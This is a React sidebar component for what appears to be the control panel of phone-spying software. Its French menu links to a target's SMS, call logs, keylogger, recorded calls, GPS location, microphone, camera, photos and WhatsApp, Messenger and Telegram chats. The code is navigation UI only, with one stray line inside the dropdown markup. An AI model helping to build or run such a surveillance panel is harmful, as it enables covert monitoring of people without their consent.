import {NavLink} from "react-router-dom";
import {useEffect, useState} from "react";
import {onAuthStateChanged} from "firebase/auth";
import {auth} from "../firebase";

let arrow = document.querySelectorAll(".arrow");

for (let i = 0; i < arrow.length; i++) {
    arrow[i].addEventListener("click", (e) => {
        let arrowParent = e.target.parentElement.parentElement;
        console.log(arrowParent);
        arrowParent.classList.toggle("showMenu");
    });
}

let sidebar = document.querySelector(".sidebar");
let sidebarBtn = document.querySelector(".sidebarBtn");

// Unsoucis sur le Onclick pour activer le arrow du subMenu
// sidebarBtn.onclick = function(){
//     sidebar.classList.toggle("active");
// }
// FinOnCilick

export default function Sidebar() {
    const [user, setUser] = useState(null);

    useEffect(() => {
        onAuthStateChanged(auth, (user) => {
            if (user) {
                setUser(user);
            }
        })
    })

    return user ? <div className="col-auto col-md-3 col-xl-2 px-sm-2 px-0 bg-dark">
        <div
            className="d-flex flex-column align-items-center align-items-sm-start px-3 pt-2 text-white min-vh-100 sidebar">
            <NavLink to="/"
               className="d-flex align-items-center pb-3 mb-md-0 me-md-auto text-white text-decoration-none logo-details">
                <i className='bx bx-globe'/>
                <span className="fs-5 d-none d-sm-inline logo">CRTI</span>
            </NavLink>

            {
                <ul className="nav-links">
                    <li>
                        <NavLink to="/">
                            <i className='bx bxs-home'/>
                            <span className="link_name ft">Tableau de bord</span>
                        </NavLink>
                    </li>

                    {/* SubMenu alternative for presentation */}
                    <li>
                        <NavLink to="/contacts">
                            <i className='bx bx-phone-call'/>
                            <span className="link_name ft">Contact</span>
                        </NavLink>
                    </li>

                    <li>
                        <NavLink to="/sms">
                            <i className='bx bx-text'/>
                            <span className="link_name ft">Messages texts</span>
                        </NavLink>
                    </li>

                    <li>
                        <NavLink to="/call-logs">
                            <i className='bx bx-log-in-circle'/>
                            <span className="link_name ft">Appels</span>
                        </NavLink>
                    </li>

                    <li>
                        <NavLink to="/keylogger">
                            <i className='bx bx-dialpad-alt'/>
                            <span className="link_name ft">Saisie clavier</span>
                        </NavLink>
                    </li>

                    <li>
                        <NavLink to="/installed-apps">
                            <i className='bx bxs-comment-detail'/>
                            <span className="link_name ft">Application</span>
                        </NavLink>
                    </li>

                    <li>
                        <NavLink to="/calls">
                            <i className='bx bx-podcast'/>
                            <span className="link_name ft">Appels enreg</span>
                        </NavLink>
                    </li>
                    {/* End SubMenu alternative for presentation */}

                    <li>
                        <NavLink to="/emplacement-gps">
                            <i className='bx bx-location-plus'/>
                            <span className="link_name ft">Position actuelle</span>
                        </NavLink>
                    </li>

                    <li>
                        <NavLink to="/emplacements-gps">
                            <i className='bx bx-current-location'/>
                            <span className="link_name ft">Emplacements GPS</span>
                        </NavLink>
                    </li>

                    <li>
                        <NavLink to="/microphone">
                            <i className='bx bx-microphone'/>
                            <span className="link_name ft">Microphone</span>
                        </NavLink>
                    </li>

                    <li>
                        <NavLink to="/photos">
                            <i className='bx bx-photo-album'/>
                            <span className="link_name ft">Photos</span>
                        </NavLink>
                    </li>
                    <li>
                        <NavLink to="/videos">
                            <i className='bx bx-video'/>
                            <span className="link_name ft">Vidéos</span>
                        </NavLink>
                    </li>

                    <li>
                        <NavLink to="/social/whatsapp">
                            <i className='bx bxl-whatsapp'/>
                            <span className="link_name ft">WhatsApp</span>
                        </NavLink>
                    </li>

                    <li>
                        <NavLink to="/social/whatsapp-audio">
                            <i className='bx bxl-whatsapp'/>
                            <span className="link_name ft">WhatsApp audio</span>
                        </NavLink>
                    </li>

                    <li>
                        <NavLink to="/social/messenger">
                            <i className='bx bxl-meta'/>
                            <span className="link_name ft">Messenger</span>
                        </NavLink>
                    </li>

                    <li>
                        <NavLink to="/social/telegram">
                            <i className='bx bxl-telegram'/>
                            <span className="link_name ft">Telegram</span>
                        </NavLink>
                    </li>

                    {/* <li>
                                <a href="/screenshots">
                                    <i class='bx bx-screenshot' ></i>
                                    <span className="link_name ft">Capture Caméra</span>
                                </a>
                                <ul className="sub-menu blank">
                                    <li><a href="#" className="l-name ft">capture</a></li>
                                </ul>
                            </li> */}

                    <li>
                        <NavLink to="/capture-camera">
                            <i className='bx bx-screenshot'/>
                            <span className="link_name ft">Capture camera</span>
                        </NavLink>
                    </li>
                </ul>

            }
            <hr/>
            <div className="dropdown pb-4">
                <NavLink to="/"
                   className="d-flex align-items-center text-white text-decoration-none dropdown-toggle"
                   id="dropdownUser1" data-bs-toggle="dropdown" aria-expanded="false">
                    <img src="https://github.com/mdo.png" alt="hugenerd" width="30" height="30"
                         className="rounded-circle"/>
                    <span className="d-none d-sm-inline mx-1">{user?.email}</span>
                </NavLink>
                <ul className="dropdown-menu dropdown-menu-dark text-small shadow">
                    <li><a className="dropdown-item" href="#">Settings</a>
                        > Odilon:
                    </li>
                    <li>
                        <hr className="dropdown-divider"/>
                    </li>
                    <li><a className="dropdown-item" href="#">Déconnexion</a></li>
                </ul>
            </div>
        </div>
    </div> : <></>
}
